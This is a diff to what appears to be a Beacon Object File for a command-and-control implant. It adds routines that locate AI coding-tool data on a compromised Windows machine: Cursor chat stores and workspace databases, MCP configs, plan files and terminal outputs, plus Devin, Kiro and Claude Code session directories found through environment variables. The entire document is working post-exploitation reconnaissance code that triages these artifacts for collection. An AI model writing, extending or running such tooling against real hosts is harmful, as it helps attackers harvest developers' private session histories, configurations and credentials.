@@ -25,11 +25,13 @@
 #define BOF_TOP_SESSIONS_PER_TOOL 3
 #define BOF_TOP_SESSION_COUNT (BOF_SESSION_TOOL_COUNT * BOF_TOP_SESSIONS_PER_TOOL)
 #define BOF_DYNAMIC_DISCOVERY_LIMIT 5000
-#define BOF_DYNAMIC_ROOT_LIMIT (BOF_DYNAMIC_DISCOVERY_LIMIT / 4)
+#define BOF_DYNAMIC_ROOT_LIMIT (BOF_DYNAMIC_DISCOVERY_LIMIT / 6)
 #define BOF_DYNAMIC_DISCOVERY_MAX_DEPTH 6
 #define BOF_CHILD_ENTRY_SCAN_LIMIT 10000
 
 DECLSPEC_IMPORT DWORD WINAPI KERNEL32$ExpandEnvironmentStringsW(LPCWSTR, wchar_t *, DWORD);
+DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetEnvironmentVariableW(LPCWSTR, LPWSTR, DWORD);
+DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
 DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileAttributesW(LPCWSTR);
 DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$FindFirstFileW(LPCWSTR, LPWIN32_FIND_DATAW);
 DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FindNextFileW(HANDLE, LPWIN32_FIND_DATAW);
@@ -73,6 +75,7 @@ static int g_dynamic_root_entries_scanned = 0;
 static int g_dynamic_scan_partial = 0;
 static int g_child_entries_scanned = 0;
 static int g_child_scan_partial = 0;
+static unsigned int g_relocatable_env_flags = 0;
 
 static void inline_memset(void *dest, int value, size_t count) {
     unsigned char *d = (unsigned char *)dest;
@@ -804,6 +807,12 @@ static void print_bof_human_triage_summary(const bl_scan_results_t *results) {
     if (sessions) BeaconPrintf(CALLBACK_OUTPUT, "[i]   Session locations:    %d\n", sessions);
     for (i = 0; i < BOF_SESSION_TOOL_COUNT; i++) session_artifacts += g_session_artifact_counts[i];
     if (sessions || g_session_scan_partial) BeaconPrintf(CALLBACK_OUTPUT, "[i]   Session artifacts:    %d%s\n", session_artifacts, g_session_scan_partial ? " (partial scan)" : "");
+    {
+        char reloc_summary[256];
+        if (bl_relocatable_env_summary(g_relocatable_env_flags, reloc_summary, sizeof(reloc_summary))) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[i]   Relocatable env set:  %s\n", reloc_summary);
+        }
+    }
     BeaconPrintf(CALLBACK_OUTPUT, "%s   Discovery status:     %s\n[i]\n", (g_dynamic_scan_partial || g_bof_triage_target_overflow || g_session_scan_partial) ? "[!]" : "[i]", (g_dynamic_scan_partial || g_bof_triage_target_overflow || g_session_scan_partial) ? "PARTIAL" : "COMPLETE");
     print_bof_collection_first();
     print_bof_review_next();
@@ -928,6 +937,131 @@ static int bof_report_path_if_exists(
     return 1;
 }
 
+static int bof_get_env_w(const wchar_t *name, wchar_t *value, size_t value_chars) {
+    DWORD needed;
+    if (!name || !value || value_chars == 0) {
+        return 0;
+    }
+    needed = KERNEL32$GetEnvironmentVariableW(name, value, (DWORD)value_chars);
+    return needed > 0 && needed < value_chars;
+}
+
+static int bof_join_root_relative(wchar_t *out, size_t out_chars, const wchar_t *root, const char *relative) {
+    size_t used;
+    size_t i;
+    if (!out || out_chars == 0 || !root || !*root) {
+        return 0;
+    }
+    used = 0;
+    while (root[used] && used + 1 < out_chars) {
+        out[used] = root[used];
+        used++;
+    }
+    if (root[used]) {
+        out[0] = L'\0';
+        return 0;
+    }
+    out[used] = L'\0';
+    if (!relative || !*relative) {
+        return 1;
+    }
+    if (used > 0 && out[used - 1] != L'\\' && out[used - 1] != L'/') {
+        if (used + 1 >= out_chars) {
+            out[0] = L'\0';
+            return 0;
+        }
+        out[used++] = L'\\';
+        out[used] = L'\0';
+    }
+    for (i = 0; relative[i]; i++) {
+        if (used + 1 >= out_chars) {
+            out[0] = L'\0';
+            return 0;
+        }
+        out[used++] = (relative[i] == '/') ? L'\\' : (wchar_t)(unsigned char)relative[i];
+        out[used] = L'\0';
+    }
+    return 1;
+}
+
+static void bof_report_env_targets(
+    const char *tool,
+    const wchar_t *root,
+    const bl_env_relative_target_t *targets,
+    size_t target_count,
+    bl_scan_results_t *results,
+    const bl_scan_filters_t *filters
+) {
+    size_t i;
+    wchar_t path[BL_MAX_PATH_LEN];
+    if (!tool || !root || !*root || !targets) {
+        return;
+    }
+    for (i = 0; i < target_count; i++) {
+        if (!bof_join_root_relative(path, BL_MAX_PATH_LEN, root, targets[i].relative)) {
+            continue;
+        }
+        bof_report_path_if_exists(tool, targets[i].family, path, results, filters, bof_emit_triage);
+    }
+}
+
+static void bof_scan_relocatable_env_targets(bl_scan_results_t *results, const bl_scan_filters_t *filters) {
+    wchar_t env_value[BL_MAX_PATH_LEN];
+    wchar_t profile[BL_MAX_PATH_LEN];
+    wchar_t path[BL_MAX_PATH_LEN];
+    char store_value[64];
+    size_t i;
+    DWORD store_needed;
+
+    g_relocatable_env_flags = 0;
+    if (bof_get_env_w(L"DEVIN_SESSIONS_DIR", env_value, BL_MAX_PATH_LEN)) {
+        g_relocatable_env_flags |= BL_RELOC_DEVIN_SESSIONS_DIR;
+        bof_report_env_targets(
+            "devin",
+            env_value,
+            BL_DEVIN_SESSIONS_DIR_TARGETS,
+            BL_DEVIN_SESSIONS_DIR_TARGETS_COUNT,
+            results,
+            filters
+        );
+    }
+    store_needed = KERNEL32$GetEnvironmentVariableA("DEVIN_SESSION_STORE", store_value, (DWORD)sizeof(store_value));
+    if (store_needed > 0 && store_needed < sizeof(store_value) && bl_ascii_equals_ci(store_value, "files")) {
+        g_relocatable_env_flags |= BL_RELOC_DEVIN_SESSION_STORE_FILES;
+        if (!(g_relocatable_env_flags & BL_RELOC_DEVIN_SESSIONS_DIR) &&
+            bof_get_env_w(L"USERPROFILE", profile, BL_MAX_PATH_LEN)) {
+            for (i = 0; i < BL_DEVIN_DEFAULT_SESSION_ROOTS_COUNT; i++) {
+                if (!bof_join_root_relative(path, BL_MAX_PATH_LEN, profile, BL_DEVIN_DEFAULT_SESSION_ROOTS[i])) {
+                    continue;
+                }
+                bof_report_path_if_exists("devin", "sessions", path, results, filters, bof_emit_triage);
+            }
+        }
+    }
+    if (bof_get_env_w(L"KIRO_HOME", env_value, BL_MAX_PATH_LEN)) {
+        g_relocatable_env_flags |= BL_RELOC_KIRO_HOME;
+        bof_report_env_targets(
+            "kiro",
+            env_value,
+            BL_KIRO_HOME_TARGETS,
+            BL_KIRO_HOME_TARGETS_COUNT,
+            results,
+            filters
+        );
+    }
+    if (bof_get_env_w(L"KIRO_SESSIONS_DIR", env_value, BL_MAX_PATH_LEN)) {
+        g_relocatable_env_flags |= BL_RELOC_KIRO_SESSIONS_DIR;
+        bof_report_env_targets(
+            "kiro",
+            env_value,
+            BL_KIRO_SESSIONS_DIR_TARGETS,
+            BL_KIRO_SESSIONS_DIR_TARGETS_COUNT,
+            results,
+            filters
+        );
+    }
+}
+
 static int bof_path_recorded(const wchar_t *path) {
     int i;
     for (i = 0; i < g_bof_triage_target_count; i++) {
@@ -952,12 +1086,13 @@ static void bof_scan_dynamic_tree(
     const char *tool,
     const wchar_t *directory,
     int depth,
-    int include_plan_metadata,
+    int discovery_mode,
     bl_scan_results_t *results,
     const bl_scan_filters_t *filters
 ) {
     wchar_t search[BL_MAX_PATH_LEN];
     wchar_t child[BL_MAX_PATH_LEN];
+    DWORD root_attributes;
     WIN32_FIND_DATAW find_data;
     HANDLE find_handle;
     if (depth < 0 || g_dynamic_entries_scanned >= BOF_DYNAMIC_DISCOVERY_LIMIT ||
@@ -966,6 +1101,8 @@ static void bof_scan_dynamic_tree(
             g_dynamic_root_entries_scanned >= BOF_DYNAMIC_ROOT_LIMIT) g_dynamic_scan_partial = 1;
         return;
     }
+    root_attributes = KERNEL32$GetFileAttributesW(directory);
+    if (root_attributes == INVALID_FILE_ATTRIBUTES || (root_attributes & FILE_ATTRIBUTE_REPARSE_POINT)) return;
     inline_memset(search, 0, sizeof(search));
     if (!build_path(directory, L"\\*", search, BL_MAX_PATH_LEN)) return;
     inline_memset(&find_data, 0, sizeof(find_data));
@@ -982,13 +1119,31 @@ static void bof_scan_dynamic_tree(
             !append_wide_in_place(child, find_data.cFileName, BL_MAX_PATH_LEN)) continue;
         if (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
         if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-            if (depth > 0) bof_scan_dynamic_tree(tool, child, depth - 1, include_plan_metadata, results, filters);
-        } else if (wide_ends_with_ascii_ci(child, "\\.mcp.json")) {
+            if (ascii_equal_n_ci(tool, c_string_len(tool), "cursor") && !discovery_mode && depth == BOF_DYNAMIC_DISCOVERY_MAX_DEPTH - 1 &&
+                (wide_ends_with_ascii_ci(child, "\\terminals") || wide_ends_with_ascii_ci(child, "\\agent-tools"))) {
+                bof_scan_dynamic_tree(tool, child, depth - 1, BL_DISCOVERY_PROJECT_OUTPUTS, results, filters);
+                continue;
+            }
+            if ((discovery_mode == BL_DISCOVERY_PROJECT_OUTPUTS || discovery_mode == BL_DISCOVERY_CHAT_COMPANIONS) && depth == 0) { g_dynamic_scan_partial = 1; continue; }
+            if (ascii_equal_n_ci(tool, c_string_len(tool), "cursor") && !discovery_mode && depth == BOF_DYNAMIC_DISCOVERY_MAX_DEPTH - 1 && wide_ends_with_ascii_ci(child, "\\mcps")) {
+                bof_report_dynamic_file(tool, "mcp", child, results, filters);
+                continue;
+            }
+            if (depth > 0) bof_scan_dynamic_tree(tool, child, depth - 1, discovery_mode, results, filters);
+        } else if (discovery_mode == BL_DISCOVERY_PROJECT_OUTPUTS) {
+            bof_report_dynamic_file(tool, "workspace", child, results, filters);
+        } else if (discovery_mode == BL_DISCOVERY_CHAT_COMPANIONS && (wide_ends_with_ascii_ci(child, "\\store.db-wal") || wide_ends_with_ascii_ci(child, "\\store.db-shm"))) {
+            bof_report_dynamic_file(tool, "sessions", child, results, filters);
+        } else if (discovery_mode == BL_DISCOVERY_WORKSPACE_DATABASES && depth == 0 && (wide_ends_with_ascii_ci(child, "\\state.vscdb") || wide_ends_with_ascii_ci(child, "\\state.vscdb-wal") || wide_ends_with_ascii_ci(child, "\\state.vscdb-shm") || wide_ends_with_ascii_ci(child, "\\state.vscdb.backup") || wide_ends_with_ascii_ci(child, "\\state.vscdb.backup-wal") || wide_ends_with_ascii_ci(child, "\\state.vscdb.backup-shm"))) {
+            bof_report_dynamic_file(tool, "sessions", child, results, filters);
+        } else if (ascii_equal_n_ci(tool, c_string_len(tool), "cursor") && !discovery_mode && depth == BOF_DYNAMIC_DISCOVERY_MAX_DEPTH - 1 && wide_ends_with_ascii_ci(child, "\\.workspace-trusted")) {
+            bof_report_dynamic_file(tool, "workspace", child, results, filters);
+        } else if (!discovery_mode && wide_ends_with_ascii_ci(child, "\\.mcp.json")) {
             bof_report_dynamic_file(tool, "mcp", child, results, filters);
         } else if (ascii_equal_n_ci(tool, c_string_len(tool), "claude_code") &&
                    wide_ends_with_ascii_ci(child, "\\sessions-index.json")) {
             bof_report_dynamic_file(tool, "sessions", child, results, filters);
-        } else if (include_plan_metadata && wide_ends_with_ascii_ci(find_data.cFileName, ".plan.md")) {
+        } else if (discovery_mode == 1 && wide_ends_with_ascii_ci(find_data.cFileName, ".plan.md")) {
             bof_report_dynamic_file(tool, "plans", child, results, filters);
         }
     } while (KERNEL32$FindNextFileW(find_handle, &find_data));
@@ -1041,6 +1196,14 @@ static void bof_scan_dynamic_targets(bl_scan_results_t *results, const bl_scan_f
     g_dynamic_root_entries_scanned = 0;
     if (build_path(profile, L"\\.cursor\\plans", root, BL_MAX_PATH_LEN))
         bof_scan_dynamic_tree("cursor", root, 0, 1, results, filters);
+    inline_memset(root, 0, sizeof(root));
+    g_dynamic_root_entries_scanned = 0;
+    if (build_path(profile, L"\\.cursor\\chats", root, BL_MAX_PATH_LEN))
+        bof_scan_dynamic_tree("cursor", root, BOF_DYNAMIC_DISCOVERY_MAX_DEPTH, BL_DISCOVERY_CHAT_COMPANIONS, results, filters);
+    inline_memset(root, 0, sizeof(root));
+    g_dynamic_root_entries_scanned = 0;
+    if (build_path(profile, L"\\AppData\\Roaming\\Cursor\\User\\workspaceStorage", root, BL_MAX_PATH_LEN))
+        bof_scan_dynamic_tree("cursor", root, 1, BL_DISCOVERY_WORKSPACE_DATABASES, results, filters);
 }
 
 void go(char *args, unsigned long alen) {
@@ -1062,6 +1225,7 @@ void go(char *args, unsigned long alen) {
     g_dynamic_scan_partial = 0;
     g_child_entries_scanned = 0;
     g_child_scan_partial = 0;
+    g_relocatable_env_flags = 0;
 
     bl_scan_static_targets(
         BL_STATIC_TARGETS,
@@ -1072,6 +1236,7 @@ void go(char *args, unsigned long alen) {
         bof_report_path_if_exists,
         bof_emit_triage
     );
+    bof_scan_relocatable_env_targets(&results, &filters);
     bof_scan_dynamic_targets(&results, &filters);
     scan_session_candidates();
     print_bof_human_triage_summary(&results);
